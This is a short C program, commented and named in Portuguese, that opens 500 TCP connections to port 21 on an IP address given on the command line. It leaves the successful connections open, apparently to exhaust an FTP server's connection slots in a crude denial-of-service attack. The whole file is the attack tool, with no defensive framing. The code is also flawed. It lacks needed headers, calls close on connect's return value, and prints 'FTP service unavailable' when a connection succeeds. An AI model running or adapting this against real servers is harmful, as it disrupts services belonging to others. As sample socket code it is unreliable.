#include <stdio.h>
#include <netdb.h>

int main(int argc, char *argv[])
 {

	int meusocket;
	int conecta;

	int ataque;
	int inicio = 0;
	int final =500;
	char *destino;
	destino = argv[1];


	struct sockaddr_in alvo;

	for(ataque=inicio;ataque<final;ataque++)
	{

	meusocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(21);
	alvo.sin_addr.s_addr = inet_addr(destino);

	conecta = connect(meusocket,(struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0)
	{

		printf("Serviço FTP indisponivel.. \n");

	}else{


		close(meusocket);
		close(conecta);
	}

	}
} 
